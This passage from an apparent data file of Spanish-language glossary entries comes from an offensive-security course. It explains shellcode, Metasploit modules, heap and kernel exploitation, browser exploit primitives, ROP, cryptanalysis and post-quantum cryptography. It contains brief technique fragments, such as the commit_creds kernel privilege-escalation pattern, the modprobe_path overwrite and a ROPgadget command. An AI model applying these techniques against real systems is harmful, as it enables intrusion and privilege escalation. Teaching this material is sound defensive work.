      "El **shellcode** es un pequeño bloque de **código máquina** (a menudo lanza una shell, `/bin/sh`) que se inyecta y se ejecuta al **redirigir la ejecución** con un overflow. Debe ser **independiente de posición** y a veces evitar **bytes nulos**. `msfvenom` o `pwntools` lo generan.\n" +
      "> ⚠️ Con DEP/NX el stack no es ejecutable, así que el shellcode directo se sustituye por **ROP**.",
    examples: [
      "Un shellcode execve('/bin/sh') inyectado tras el overflow.",
      "Generar shellcode con pwntools para un exploit.",
    ],
    related: ["Buffer overflow", "Gestión de memoria", "msfvenom"],
  },

  // ── M56 · Go para Security Tools ─────────────────────────────────────────
  {
    id: 590,
    module: 56,
    term: "Fundamentos de Go",
    short: "Compilado, multiplataforma y de binario único: ideal para herramientas portables.",
    detail:
      "**Go** compila a un **binario único sin dependencias**, multiplataforma (cross-compile trivial) y rápido. Por eso es el lenguaje preferido para **herramientas ofensivas modernas** que deben correr en cualquier host sin instalar nada.\n" +
      "> 💡 Un `GOOS=windows go build` produce un .exe portable desde Linux.",
    examples: [
      "Compilar una herramienta para Windows, Linux y macOS de una vez.",
      "Un implante de un solo binario sin runtime que instalar.",
    ],
    related: ["Concurrencia y goroutines", "Network tools en Go", "Túneles con chisel y ligolo"],
  },
  {
    id: 591,
    module: 56,
    term: "Concurrencia y goroutines",
    short: "Las goroutines hacen trivial la concurrencia masiva: escaneos ultrarrápidos.",
    detail:
      "Las **goroutines** son hilos ligerísimos: lanzar miles es barato. Combinadas con **canales**, hacen que Go destaque en tareas **concurrentes** como escanear miles de puertos/hosts en paralelo a gran velocidad.\n" +
      "go scan(host, port) // lanza una goroutine\n" +
      "> 💡 Por esto muchos escáneres modernos (httpx, naabu) están en Go.",
    examples: [
      "Un port scanner concurrente que barre /16 en segundos.",
      "Procesar miles de URLs en paralelo con un pool de workers.",
    ],
    related: ["Fundamentos de Go", "Network tools en Go", "Tipos de escaneo Nmap"],
  },
  {
    id: 592,
    module: 56,
    term: "Network tools en Go",
    short: "La librería estándar de red de Go es robusta y suficiente para casi todo.",
    detail:
      "La **stdlib** de Go (`net`, `net/http`, `crypto/tls`) cubre TCP/UDP, HTTP y TLS sin dependencias externas. Eso, con la concurrencia y el binario único, hace de Go la base de muchas herramientas de recon y red de la comunidad (proyectos de ProjectDiscovery).",
    examples: [
      "Un cliente HTTP concurrente para fuzzing de directorios.",
      "Un pequeño proxy/redirector escrito con net.",
    ],
    related: ["Concurrencia y goroutines", "Túneles con chisel y ligolo", "Fundamentos de Go"],
  },
  {
    id: 593,
    module: 56,
    term: "Por qué Go en tooling (chisel/ligolo)",
    short: "Binario portable + concurrencia explica por qué el tooling de pivoting moderno es Go.",
    detail:
      "Herramientas de **pivoting** como **chisel** y **ligolo-ng** están en Go precisamente por sus ventajas: un **binario único** que se sube a la víctima sin dependencias, **cross-compilation** para cualquier objetivo y **concurrencia** para manejar múltiples túneles. Es el sweet spot del tooling ofensivo actual.",
    examples: [
      "Subir el binario Go de chisel a un host Windows comprometido.",
      "ligolo-ng (Go) creando una interfaz hacia la red interna.",
    ],
    related: ["Network tools en Go", "Túneles con chisel y ligolo", "Fundamentos de Go"],
  },

  // ── M57 · Ruby y Metasploit Development ──────────────────────────────────
  {
    id: 600,
    module: 57,
    term: "Fundamentos de Ruby",
    short: "El lenguaje de Metasploit: dinámico, expresivo y orientado a objetos.",
    detail:
      "**Ruby** es el lenguaje en el que está escrito **Metasploit Framework**. Es dinámico y muy expresivo, lo que facilita escribir y modificar **módulos** del framework. Saber Ruby es lo que permite ir más allá de *usar* Metasploit a **extenderlo**.",
    examples: [
      "Modificar un módulo existente de MSF para un caso propio.",
      "Entender el código de un exploit de Metasploit.",
    ],
    related: ["Estructura de un módulo MSF", "Exploits custom en MSF", "Arquitectura de Metasploit"],
  },
  {
    id: 601,
    module: 57,
    term: "Estructura de un módulo MSF",
    short: "Cada módulo de Metasploit sigue una plantilla: metadatos, opciones y la lógica.",
    detail:
      "Un **módulo MSF** es una clase Ruby con partes bien definidas: `initialize` (**metadatos**: nombre, autor, referencias), `register_options` (RHOSTS, RPORT…), y el método principal (`exploit` o `run`). Heredar de la clase adecuada da gratis todo el plumbing del framework.\n" +
      "> 💡 Ver el diagrama 'Estructura de un módulo de Metasploit' con el flujo de desarrollo.",
    examples: [
      "Un módulo auxiliary con register_options y run.",
      "Un exploit que define check y exploit.",
    ],
    related: ["Fundamentos de Ruby", "Exploits custom en MSF", "Auxiliares y post-explotación"],
  },
  {
    id: 602,
    module: 57,
    term: "Exploits custom en MSF",
    short: "Escribir un exploit propio dentro del framework para reutilizar payloads y handlers.",
    detail:
      "Desarrollar un **exploit custom** en MSF aprovecha toda la maquinaria: catálogo de **payloads**, **encoders**, manejo de sesiones y **handlers** automáticos. En vez de un PoC suelto, se obtiene un exploit integrado, con `check` para verificar vulnerabilidad y `targets` para distintas versiones.",
    examples: [
      "Portar un PoC de un overflow a un módulo exploit de MSF.",
      "Definir varios targets con offsets distintos por versión.",
    ],
    related: ["Estructura de un módulo MSF", "Payloads y Meterpreter", "Buffer overflow"],
  },
  {
    id: 603,
    module: 57,
    term: "Auxiliares y post-explotación",
    short: "No todo es explotar: módulos auxiliary (escaneo/fuzzing) y post (tras el acceso).",
    detail:
      "Además de exploits, MSF tiene:\n" +
      "• **Auxiliary** — escáneres, fuzzers, brute forcers (sin payload).\n" +
      "• **Post** — módulos que corren **tras** obtener una sesión: recolectar credenciales, pivotar, persistencia.\n" +
      "Saber escribirlos automatiza fases enteras de un engagement.",
    examples: [
      "Un módulo auxiliary de brute force SSH.",
      "Un módulo post que vuelca hashes de la máquina comprometida.",
    ],
    related: ["Estructura de un módulo MSF", "Post-explotación", "Exploits custom en MSF"],
  },

  // ── M58 · HTML/CSS y Seguridad Frontend ──────────────────────────────────
  {
    id: 610,
    module: 58,
    term: "Estructura HTML",
    short: "El esqueleto de toda página web: entenderlo es la base del análisis frontend.",
    detail:
      "**HTML** define la estructura de la página con etiquetas y atributos. Conocerla permite **inspeccionar** una web (DevTools), entender cómo se inyecta un XSS (qué contexto: atributo, etiqueta, script) y reconocer elementos sospechosos (iframes ocultos, formularios que apuntan fuera).",
    examples: [
      "Inspeccionar el DOM con las DevTools del navegador.",
      "Detectar un iframe invisible usado para clickjacking.",
    ],
    related: ["Formularios e inputs", "Detección de páginas de phishing", "Fundamentos de JavaScript"],
  },
  {
    id: 611,
    module: 58,
    term: "Formularios e inputs",
    short: "Los formularios son la principal vía de entrada de datos — y de ataques.",
    detail:
      "Los **`<form>`** e **`<input>`** recogen datos del usuario y son la puerta de la mayoría de los ataques web (inyección, XSS, CSRF). El atributo **`action`** indica adónde van los datos: si apunta a un dominio externo, es señal de phishing/exfiltración.",
    examples: [
      "Un formulario de login cuyo action apunta a otro dominio.",
      "Inputs sin restricción que permiten inyectar payloads.",
    ],
    related: ["Estructura HTML", "Validación client-side y sus límites", "Cross-Site Request Forgery (CSRF)"],
  },
  {
    id: 612,
    module: 58,
    term: "Validación client-side y sus límites",
    short: "La validación en el navegador mejora la UX, pero el atacante la salta a voluntad.",
    detail:
      "La **validación del lado del cliente** (HTML5 `required`, JS) es **solo para la experiencia de usuario**: el atacante controla su navegador y puede **saltársela** (editar el DOM, mandar la petición directa con Burp/curl).\n" +
      "> ⚠️ Regla de oro: **toda validación se repite en el servidor**. El cliente nunca es de confianza.",
    examples: [
      "Quitar el atributo 'maxlength' por DevTools y enviar más datos.",
      "Mandar la petición con curl saltándose la validación JS.",
    ],
    related: ["Formularios e inputs", "Prevención de inyección", "Node.js security"],
  },
  {
    id: 613,
    module: 58,
    term: "Detección de páginas de phishing",
    short: "Reconocer las señales en el HTML/CSS de un sitio que suplanta a otro.",
    detail:
      "Analizar el frontend de un sitio sospechoso revela el phishing: **formularios** que envían a un dominio distinto, **recursos** (logos, CSS) cargados del sitio legítimo, dominios **lookalike**, y JS que captura credenciales. Es útil para triage de URLs reportadas.\n" +
      "> 💡 Un kit de phishing suele clonar el HTML de la víctima pero cambiar el `action` del formulario.",
    examples: [
      "Un clon de un portal bancario con el action apuntando al atacante.",
      "CSS y logos cargados directamente del banco real (hotlinking).",
    ],
    related: ["Estructura HTML", "Formularios e inputs", "Evasión de filtros"],
  },

  // ── M59 · Heap Exploitation ──────────────────────────────────────────────
  {
    id: 620,
    module: 59,
    term: "El heap de glibc",
    short: "La memoria dinámica se gestiona en 'chunks' agrupados en listas (bins) para reusarlos.",
    detail:
      "El **heap** sirve la memoria dinámica (`malloc`/`free`). glibc la organiza en **chunks** (con cabeceras de tamaño y flags) y, al liberarlos, los guarda en listas llamadas **bins** para reutilizarlos. Entender esa estructura es lo que permite **corromperla** de forma controlada.\n" +
      "> 💡 La metadata de los chunks vive *junto* a los datos: por eso un overflow de heap puede pisar punteros de gestión.",
    examples: [
      "Un overflow que sobrescribe el campo size del chunk siguiente.",
      "Inspeccionar el heap con el comando 'heap' de pwndbg/gef.",
    ],
    related: ["tcache y fastbin", "Use-after-free y double free", "Gestión de memoria"],
  },
  {
    id: 621,
    module: 59,
    term: "tcache y fastbin",
    short: "Listas rápidas de chunks libres, simples de envenenar para lograr escritura arbitraria.",
    detail:
      "**tcache** (per-thread) y **fastbin** son listas enlazadas simples de chunks pequeños liberados, pensadas para velocidad — con pocas comprobaciones. El **tcache poisoning** sobrescribe el puntero `next` de un chunk libre para que el siguiente `malloc` devuelva una **dirección elegida** por el atacante.\n" +
      "> 💡 El tcache poisoning es hoy la primitiva de heap más usada por su simplicidad.",
    examples: [
      "Envenenar el tcache para que malloc devuelva un puntero a __free_hook.",
      "Un double free en fastbin para duplicar un chunk.",
    ],
    related: ["El heap de glibc", "Use-after-free y double free", "Técnicas 'House of'"],
  },
  {
    id: 622,
    module: 59,
    term: "Use-after-free y double free",
    short: "Usar o liberar memoria ya liberada corrompe el heap de forma explotable.",
    detail:
      "• **Use-after-free (UAF)** — se sigue usando un puntero a memoria ya liberada; si el atacante reocupa ese chunk, controla los datos (o una vtable).\n" +
      "• **Double free** — liberar dos veces el mismo chunk corrompe los bins y permite reasignaciones solapadas.\n" +
      "> ⚠️ Ambos son la base de la mayoría de los exploits de heap modernos (navegadores, kernel).",
    examples: [
      "Un UAF en un objeto C++ que permite secuestrar su vtable.",
      "Un double free que habilita tcache poisoning.",
    ],
    related: ["tcache y fastbin", "El heap de glibc", "Vulnerabilidades de kernel"],
  },
  {
    id: 623,
    module: 59,
    term: "Técnicas 'House of'",
    short: "Familia de ataques clásicos al asignador para lograr escritura arbitraria.",
    detail:
      "Las técnicas **'House of …'** (Force, Spirit, Orange, Einherjar) abusan de la lógica del asignador de glibc para conseguir una **escritura casi arbitraria** o solapar chunks. Cada una explota una parte distinta (el top chunk, el unsorted bin, etc.) y va cambiando según evoluciona glibc.\n" +
      "> 💡 'House of Orange' encadena un overflow del top chunk con el flujo de `_IO_FILE` para ejecución de código.",
    examples: [
      "House of Force para extender el top chunk a una dirección objetivo.",
      "House of Orange combinando heap y file streams.",
    ],
    related: ["El heap de glibc", "tcache y fastbin"],
  },

  // ── M60 · Kernel Exploitation ────────────────────────────────────────────
  {
    id: 630,
    module: 60,
    term: "Kernel vs user space",
    short: "El kernel corre con privilegio total; explotarlo da control absoluto de la máquina.",
    detail:
      "El SO separa el **user space** (apps, sin privilegios) del **kernel space** (privilegio total, ring 0). Un exploit de kernel parte de un proceso sin privilegios y, abusando de un fallo en el kernel o un driver, **escala a root/SYSTEM** o ejecuta código en ring 0.\n" +
      "> ⚠️ Un bug de kernel suele significar compromiso **total** del sistema, saltándose toda contención de user space.",
    examples: [
      "Escalar de usuario normal a root vía un driver vulnerable.",
      "Un syscall que valida mal un puntero de user space.",
    ],
    related: ["Vulnerabilidades de kernel", "Primitivas de escalada", "Mitigaciones de kernel"],
  },
  {
    id: 631,
    module: 60,
    term: "Vulnerabilidades de kernel",
    short: "UAF, out-of-bounds y race conditions en el kernel y sus drivers.",
    detail:
      "Las clases más comunes: **use-after-free**, **out-of-bounds** (lectura/escritura), **race conditions** (TOCTOU) y confusión de tipos, a menudo en **drivers** y subsistemas (la mayor superficie). Un fallo de validación de un puntero de user space en un `ioctl` es un clásico.\n" +
      "> 💡 La mayoría de los 0-days de kernel viven en drivers de terceros, no en el core.",
    examples: [
      "Un UAF en un driver gráfico explotable desde una app.",
      "Una race condition que gana una ventana para escribir fuera de límites.",
    ],
    related: ["Kernel vs user space", "Primitivas de escalada", "Use-after-free y double free"],
  },
  {
    id: 632,
    module: 60,
    term: "Primitivas de escalada",
    short: "Objetivos clásicos en memoria de kernel que convierten un bug en root.",
    detail:
      "Tras lograr una escritura en kernel, se apunta a **primitivas** conocidas:\n" +
      "• **`modprobe_path`** — sobrescribir esta cadena para ejecutar un binario propio como root.\n" +
      "• **struct `cred`** — poner `uid=0` en las credenciales del proceso actual.\n" +
      "• **`commit_creds(prepare_kernel_cred(0))`** — el patrón clásico para volverse root.\n" +
      "> 💡 Estas primitivas convierten una escritura limitada en una escalada completa y fiable.",
    examples: [
      "Sobrescribir modprobe_path a /tmp/x para ejecutar como root.",
      "Parchear el struct cred del proceso para uid 0.",
    ],
    related: ["Vulnerabilidades de kernel", "Kernel vs user space", "Mitigaciones de kernel"],
  },
  {
    id: 633,
    module: 60,
    term: "Mitigaciones de kernel",
    short: "SMEP, SMAP, KASLR y KPTI dificultan la explotación de kernel.",
    detail:
      "El kernel moderno se defiende con varias mitigaciones:\n" +
      "| Mitigación | Qué impide |\n" +
      "|---|---|\n" +
      "| SMEP | Ejecutar código de user space en kernel |\n" +
      "| SMAP | Acceder a datos de user space desde kernel |\n" +
      "| KASLR | Direcciones de kernel predecibles |\n" +
      "| KPTI | Fuga de direcciones (Meltdown) |\n" +
      "El bypass suele requerir un **leak** (contra KASLR) y **ROP en kernel** (contra SMEP).",
    examples: [
      "Un infoleak de kernel para derrotar KASLR.",
      "ROP en kernel para sortear SMEP.",
    ],
    related: ["Primitivas de escalada"],
  },

  // ── M61 · Browser Exploitation ───────────────────────────────────────────
  {
    id: 640,
    module: 61,
    term: "Arquitectura del navegador y motor JS",
    short: "Multiproceso y sandbox: el renderer no confía en sí mismo, por eso hace falta una full chain.",
    detail:
      "Los navegadores son **multiproceso**: el **renderer** (que ejecuta JS y HTML no confiables) corre en un **sandbox** aislado del resto. El **motor JS** (V8, JavaScriptCore) incluye un **JIT** que compila JS a código máquina — superficie compleja y rica en bugs.\n" +
      "> 💡 Por el sandbox, comprometer el renderer **no** es suficiente: hace falta un segundo bug para escapar (full chain).",
    examples: [
      "El renderer de Chrome aislado por sitio (site isolation).",
      "El JIT optimizando una función caliente a código nativo.",
    ],
    related: ["Vulnerabilidades del motor JS", "Primitivas de explotación", "Sandbox escape y full chain"],
  },
  {
    id: 641,
    module: 61,
    term: "Vulnerabilidades del motor JS",
    short: "Type confusion y bugs del JIT son la vía clásica de entrada en un navegador.",
    detail:
      "Las vulnerabilidades estrella del motor JS:\n" +
      "• **Type confusion** — el motor trata un objeto como de un tipo que no es, leyendo/escribiendo fuera de su forma real.\n" +
      "• **Bugs del JIT** — el compilador asume invariantes incorrectas (ej. eliminación errónea de bounds checks).\n" +
      "> 💡 Un bug de type confusion suele dar directamente una primitiva de lectura/escritura relativa muy potente.",
    examples: [
      "Un JIT que elimina un bounds check necesario por un side effect.",
      "Type confusion entre dos clases con layout distinto.",
    ],
    related: ["Arquitectura del navegador y motor JS", "Primitivas de explotación", "Use-after-free y double free"],
  },
  {
    id: 642,
    module: 61,
    term: "Primitivas de explotación",
    short: "addrof/fakeobj y la lectura/escritura arbitraria: los ladrillos del exploit de navegador.",
    detail:
      "Desde un bug se construyen **primitivas**:\n" +
      "• **addrof** — obtener la dirección de un objeto JS.\n" +
      "• **fakeobj** — fabricar un objeto falso en una dirección elegida.\n" +
      "Combinadas dan **lectura/escritura arbitraria** en el espacio del renderer, con la que se sobrescribe un puntero de función o se hace ejecutable un buffer con el shellcode.\n" +
      "> 💡 'addrof + fakeobj → R/W arbitrario → RCE' es el esqueleto de casi todo exploit de motor JS.",
    examples: [
      "Construir R/W arbitrario a partir de un type confusion.",
      "Sobrescribir el puntero de una función JIT-compileada con shellcode.",
    ],
    related: ["Vulnerabilidades del motor JS", "Sandbox escape y full chain", "Shellcode básico"],
  },
  {
    id: 643,
    module: 61,
    term: "Sandbox escape y full chain",
    short: "Encadenar el bug del renderer con otro para salir del sandbox hasta el sistema.",
    detail:
      "Lograr ejecución en el renderer no basta: está en un **sandbox**. La **full chain** encadena ese primer bug con un **segundo** (en el proceso broker, el kernel o un driver) para **escapar** y obtener ejecución con privilegios del sistema. Las cadenas reales (ej. de los Pwn2Own) combinan 2-3 bugs.\n" +
      "> ⚠️ Por eso un solo bug de navegador rara vez es 'crítico' por sí mismo sin el escape.",
    examples: [
      "Renderer RCE + bug de kernel para SYSTEM (cadena de Pwn2Own).",
      "Escapar vía una IPC mal validada al proceso broker.",
    ],
    related: ["Primitivas de explotación", "Arquitectura del navegador y motor JS", "Kernel vs user space"],
  },

  // ── M62 · ROP/JOP Avanzado y Bypass de Mitigaciones ──────────────────────
  {
    id: 650,
    module: 62,
    term: "Code-reuse attacks",
    short: "Si no puedes inyectar código, reutiliza el que ya existe en el binario.",
    detail:
      "Con **DEP/NX** el stack/heap no son ejecutables, así que el shellcode inyectado no corre. La respuesta son los **code-reuse attacks**: en vez de inyectar código, se **reutiliza** el ya presente (el binario, libc) encadenando fragmentos para lograr el efecto deseado. ROP y JOP son sus formas principales.\n" +
      "> 💡 ROP nació justamente como respuesta a DEP: no necesita ejecutar memoria 'nueva'.",
    examples: [
      "ret2libc llamando a system('/bin/sh') sin shellcode propio.",
      "Reusar gadgets del binario para preparar una syscall.",
    ],
    related: ["JOP y automatización", "Buffer overflow"],
  },
  {
    id: 651,
    module: 62,
    term: "Construcción de cadenas ROP",
    short: "Encadenar 'gadgets' (trozos que terminan en ret) para ejecutar lógica arbitraria.",
    detail:
      "Un **gadget** es una secuencia corta de instrucciones que termina en `ret` (ej. `pop rdi; ret`). Encadenando gadgets en el stack se controlan registros y se invocan funciones/**syscalls** — una mini-máquina virtual hecha de pedazos del binario.\n" +
      "pop rdi; ret    ; carga el 1er argumento\n" +
      "> 💡 Objetivo típico: llamar a `mprotect` para volver ejecutable una región y saltar al shellcode, o a `system`.",
    examples: [
      "Una cadena que pone los argumentos y llama a execve.",
      "ROP a mprotect(addr, len, RWX) y luego al shellcode.",
    ],
    related: ["Code-reuse attacks", "JOP y automatización", "CFI e Intel CET"],
  },
  {
    id: 652,
    module: 62,
    term: "JOP y automatización",
    short: "Variante basada en saltos (no en ret) y herramientas para hallar gadgets.",
    detail:
      "El **JOP** (*Jump-Oriented Programming*) encadena gadgets que terminan en **saltos** (`jmp`) en vez de `ret`, evadiendo defensas centradas solo en `ret`. Encontrar gadgets a mano es inviable, así que se usan herramientas: **ROPgadget**, **ropper**, **angrop**.\n" +
      "ROPgadget --binary ./vuln | grep 'pop rdi'",
    examples: [
      "Usar ropper para listar gadgets útiles del binario.",
      "JOP cuando una mitigación vigila el flujo de los ret.",
    ],
    related: ["Construcción de cadenas ROP", "Code-reuse attacks", "CFI e Intel CET"],
  },
  {
    id: 653,
    module: 62,
    term: "CFI e Intel CET",
    short: "Mitigaciones que protegen el flujo de control para frenar ROP/JOP.",
    detail:
      "Las defensas modernas atacan la raíz del code-reuse:\n" +
      "• **CFI** (*Control-Flow Integrity*) — valida que los saltos/llamadas indirectas van a destinos legítimos.\n" +
      "• **Intel CET** — **shadow stack** (detecta retornos manipulados) + **IBT** (limita destinos de saltos indirectos).\n" +
      "> ⚠️ No son perfectas: hay bypass (gadgets 'CFI-válidos', ataques a datos), pero suben mucho el coste del exploit.",
    examples: [
      "Una shadow stack que detecta el ROP al retornar a un gadget.",
      "CFI que bloquea una llamada indirecta a un gadget arbitrario.",
    ],
    related: ["Construcción de cadenas ROP", "JOP y automatización"],
  },

  // ── M63 · Criptoanálisis ─────────────────────────────────────────────────
  {
    id: 660,
    module: 63,
    term: "Modelos de ataque criptográfico",
    short: "Se clasifican por cuánto puede el atacante: del solo-cifrado al texto-claro elegido.",
    detail:
      "La fortaleza de un cifrado se mide contra atacantes de **poder creciente**:\n" +
      "| Modelo | El atacante tiene |\n" +
      "|---|---|\n" +
      "| Ciphertext-only (COA) | Solo textos cifrados |\n" +
      "| Known-plaintext (KPA) | Pares claro/cifrado |\n" +
      "| Chosen-plaintext (CPA) | Puede cifrar lo que elija |\n" +
      "| Chosen-ciphertext (CCA) | Puede descifrar lo que elija |\n" +
      "> 💡 Un cifrado serio debe resistir el modelo más fuerte (**IND-CCA**); ver el diagrama de modelos de ataque.",
    examples: [
      "WEP cayó en gran parte por ataques de tipo known-plaintext.",
      "Un padding oracle es un ataque de tipo chosen-ciphertext.",
    ],
    related: ["Criptoanálisis diferencial y lineal", "Ataques a implementaciones", "Modos de operación"],
  },
  {
    id: 661,
    module: 63,
    term: "Criptoanálisis diferencial y lineal",
    short: "Las dos técnicas clásicas para atacar cifrados de bloque por sus sesgos estadísticos.",
    detail:
      "• **Diferencial** — estudia cómo **diferencias** en la entrada se propagan a la salida; si ciertas diferencias son más probables, se filtra información de la clave.\n" +
      "• **Lineal** — busca **aproximaciones lineales** entre bits de entrada, salida y clave que se cumplen con sesgo.\n" +
      "> 💡 DES fue diseñado (sin decirlo) resistente al diferencial; AES se diseñó explícitamente robusto contra ambos.",
    examples: [
      "Atacar un cifrado con pocas rondas mediante criptoanálisis diferencial.",
      "Medir el sesgo lineal de una S-box débil.",
    ],
    related: ["Modelos de ataque criptográfico", "AES vs DES/3DES", "Ataques a implementaciones"],
  },
  {
    id: 662,
    module: 63,
    term: "Side-channel attacks",
    short: "Atacar la implementación física, no las matemáticas: tiempo, consumo, caché.",
    detail:
      "Un **canal lateral** filtra información por **cómo se ejecuta** el algoritmo, no por su diseño:\n" +
      "• **Timing** — el tiempo de cómputo depende de bits de la clave.\n" +
      "• **Power/EM** — el consumo eléctrico revela operaciones (DPA).\n" +
      "• **Cache** — accesos a memoria dependientes de la clave (Flush+Reload).\n" +
      "> ⚠️ Mitigación: implementaciones **constant-time** (sin ramas ni accesos dependientes del secreto).",
    examples: [
      "Recuperar una clave RSA midiendo tiempos de descifrado.",
      "Un ataque de caché contra una tabla de AES no protegida.",
    ],
    related: ["Ataques a implementaciones", "Modelos de ataque criptográfico"],
  },
  {
    id: 663,
    module: 63,
    term: "Ataques a implementaciones",
    short: "El algoritmo es sólido pero su uso/implementación filtra el secreto (padding oracle).",
    detail:
      "Muchos ataques reales no rompen el cifrado sino su **implementación**: el **padding oracle** (la app revela si el padding es válido) permite descifrar CBC byte a byte; **Bleichenbacher** ataca el padding de RSA PKCS#1. La lección: los **detalles** (padding, manejo de errores, nonces) son tan críticos como el algoritmo.\n" +
      "> 💡 Usar AEAD (AES-GCM) y librerías probadas evita la mayoría de estos errores.",
    examples: [
      "Un padding oracle que descifra una cookie cifrada en CBC.",
      "Bleichenbacher (ROBOT) contra TLS mal implementado.",
    ],
    related: ["Side-channel attacks", "Modos de operación", "Modelos de ataque criptográfico"],
  },

  // ── M64 · Criptografía Post-Cuántica ─────────────────────────────────────
  {
    id: 670,
    module: 64,
    term: "Amenaza cuántica",
    short: "Shor rompe RSA/ECC; Grover solo debilita la cripto simétrica (mitigable subiendo claves).",
    detail:
      "Dos algoritmos cuánticos preocupan:\n" +
      "• **Shor** — factoriza y resuelve el logaritmo discreto en tiempo polinómico → **rompe RSA, ECC y Diffie-Hellman**.\n" +
      "• **Grover** — acelera la búsqueda (raíz cuadrada) → **debilita** la simétrica, pero basta **duplicar** la clave (AES-256) para neutralizarlo.\n" +
      "> ⚠️ El riesgo **'harvest now, decrypt later'**: capturar tráfico cifrado hoy para descifrarlo cuando exista el ordenador cuántico.",
    examples: [
      "RSA-2048 sería trivial para un ordenador cuántico grande.",
      "AES-256 se considera 'quantum-safe' (Grover solo lo lleva a ~128 bits).",
    ],
    related: ["Familias de criptografía post-cuántica", "Estándares NIST PQC", "Amenaza cuántica y post-quantum"],
  },
  {
    id: 671,
    module: 64,
    term: "Familias de criptografía post-cuántica",
    short: "Esquemas basados en problemas que ni un cuántico resuelve fácil: retículos, hash, códigos.",
    detail:
      "La **PQC** se apoya en problemas matemáticos resistentes a lo cuántico:\n" +
      "| Familia | Base | Ejemplo |\n" +
      "|---|---|---|\n" +
      "| Retículos (lattice) | Problemas en retículos | Kyber, Dilithium |\n" +
      "| Basada en hash | Seguridad de funciones hash | SPHINCS+ |\n" +
      "| Basada en códigos | Códigos correctores | Classic McEliece |\n" +
      "| Isogenias | Curvas elípticas isógenas | (SIKE, roto en 2022) |\n" +
      "> 💡 Los **retículos** dominan por su buen equilibrio tamaño/velocidad.",
    examples: [
      "Kyber (retículos) para intercambio de claves post-cuántico.",
      "SPHINCS+ (hash) como firma conservadora.",
    ],
    related: ["Amenaza cuántica", "Estándares NIST PQC", "Migración y cripto-agilidad"],
  },
  {
    id: 672,
    module: 64,
    term: "Estándares NIST PQC",
    short: "Los algoritmos post-cuánticos ya estandarizados tras años de competición pública.",
    detail:
      "Tras una competición abierta (2016-2024), el **NIST** estandarizó los primeros algoritmos PQC en 2024:\n" +
      "• **ML-KEM** (antes Kyber) — encapsulado de claves.\n" +
      "• **ML-DSA** (antes Dilithium) y **SLH-DSA** (SPHINCS+) — firmas.\n" +
      "Son la base recomendada para la transición.\n" +
      "> 💡 La caída de **SIKE** (2022) durante el proceso recordó que la PQC aún es joven; por eso se despliega en **modo híbrido** (clásico + PQC).",
    examples: [
      "Adoptar ML-KEM en TLS de forma híbrida con X25519.",
      "Firmar con ML-DSA en sistemas que deben durar décadas.",
    ],
    related: ["Familias de criptografía post-cuántica", "Migración y cripto-agilidad", "Amenaza cuántica"],
  },
  {
    id: 673,
    module: 64,
    term: "Migración y cripto-agilidad",
    short: "Cambiar de algoritmo no es trivial: hay que diseñar sistemas que puedan rotarlo.",
    detail:
      "Migrar a PQC es un proyecto plurianual: **inventariar** dónde se usa cripto, **priorizar** por sensibilidad/vida útil del dato, desplegar **híbrido** y, sobre todo, lograr **cripto-agilidad** — que el sistema pueda **cambiar de algoritmo** sin reescribirlo. Ver el diagrama 'Migración a la criptografía post-cuántica'.\n" +
      "> 💡 La cripto-agilidad es la lección clave: los algoritmos caducan; el diseño debe anticiparlo.",
    examples: [
      "Un inventario de toda la cripto de la organización (CBOM).",
      "Abstraer el algoritmo tras una interfaz para poder rotarlo.",
    ],
    related: ["Estándares NIST PQC", "Familias de criptografía post-cuántica", "Gestión de claves"],
  },

  // ── M65 · Zero-Knowledge Proofs y MPC ────────────────────────────────────
  {
    id: 680,
    module: 65,
    term: "Pruebas de conocimiento cero (ZKP)",
    short: "Probar que sabes algo sin revelar qué es.",
    detail:
      "Una **prueba de conocimiento cero** permite al *probador* convencer al *verificador* de que una afirmación es cierta **sin revelar** información más allá de su veracidad. Tres propiedades:\n" +
      "• **Completitud** — si es verdad, el verificador honesto se convence.\n" +
      "• **Solidez** — si es falso, no puede ser convencido (salvo probabilidad ínfima).\n" +
      "• **Conocimiento cero** — no se filtra nada del secreto.\n" +
      "> 💡 Ejemplo intuitivo: probar que conoces la contraseña sin enviarla.",
    examples: [
      "Autenticarte demostrando que sabes una clave sin transmitirla.",
      "Probar que tienes ≥18 años sin revelar tu fecha de nacimiento.",
    ],
    related: ["zk-SNARKs y zk-STARKs", "Secure Multi-Party Computation (MPC)", "Aplicaciones de ZKP/MPC"],
  },
  {
    id: 681,
    module: 65,
    term: "zk-SNARKs y zk-STARKs",
    short: "Pruebas ZK sucintas y no interactivas, base de la privacidad en blockchain.",
    detail:
      "Construcciones ZK modernas, **sucintas** (la prueba es pequeña y rápida de verificar) y **no interactivas**:\n" +
      "| | zk-SNARK | zk-STARK |\n" +
      "|---|---|---|\n" +
      "| Tamaño de prueba | Muy pequeño | Mayor |\n" +
      "| Setup de confianza | Requiere (riesgo) | No requiere |\n" +
      "| Post-cuántico | No | Sí (solo hash) |\n" +
      "> ⚠️ El **trusted setup** de los SNARKs es delicado: si se filtran sus secretos, se pueden falsificar pruebas.",
    examples: [
      "Zcash usa zk-SNARKs para transacciones privadas.",
      "STARKs para escalar rollups sin trusted setup.",
    ],
    related: ["Pruebas de conocimiento cero (ZKP)", "Aplicaciones de ZKP/MPC", "Familias de criptografía post-cuántica"],
  },
  {
    id: 682,
    module: 65,
    term: "Secure Multi-Party Computation (MPC)",
    short: "Varias partes computan una función conjunta sin revelarse sus datos privados.",
    detail:
      "El **MPC** permite que N partes calculen `f(x1, x2, …)` **sin** que ninguna revele su entrada `xi`. Cada una aprende solo el **resultado**. Se construye con *secret sharing* o circuitos cifrados (garbled circuits).\n" +
      "> 💡 Ejemplo clásico (Yao): dos millonarios averiguan quién es más rico sin decir cuánto tienen.",
    examples: [
      "Varios bancos detectan fraude cruzando datos sin compartirlos.",
      "Custodia de claves con MPC (firma sin reconstruir la clave).",
    ],
    related: ["Pruebas de conocimiento cero (ZKP)", "Aplicaciones de ZKP/MPC", "Cifrado homomórfico"],
  },
  {
    id: 683,
    module: 65,
    term: "Aplicaciones de ZKP/MPC",
    short: "Privacidad verificable: blockchain, identidad, votación, cómputo colaborativo.",
    detail:
      "Estas técnicas habilitan **privacidad con garantías**: transacciones privadas y *rollups* en blockchain, **identidad** y credenciales selectivas (probar atributos sin revelar el documento), **votación** verificable y análisis colaborativo de datos sensibles (salud, finanzas) sin compartirlos.",
    examples: [
      "Credenciales que prueban 'mayor de edad' sin revelar el DNI.",
      "ZK-rollups que escalan Ethereum manteniendo privacidad.",
    ],
    related: ["zk-SNARKs y zk-STARKs", "Secure Multi-Party Computation (MPC)", "Cifrado homomórfico"],
  },

